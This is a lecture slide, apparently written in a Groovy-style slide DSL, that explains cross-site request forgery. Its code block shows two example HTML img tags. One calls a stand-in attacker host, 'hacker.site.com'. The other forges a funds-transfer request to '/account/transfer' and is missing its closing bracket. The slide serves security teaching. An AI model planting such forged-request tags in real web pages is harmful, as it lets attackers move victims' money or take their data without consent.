bulletSlide 'A5: Cross-Site Request Forgery (CSRF)', {
	bullet 'Similar to an XSS attack'
	bullet "Make requests on other users' behalf and\nsend personal information/cookies/session ids"
	code '''
<img src='http://hacker.site.com?foo=bar'/>
 
<img src='/account/transfer?
     destination=123&amount=1000'
'''
}
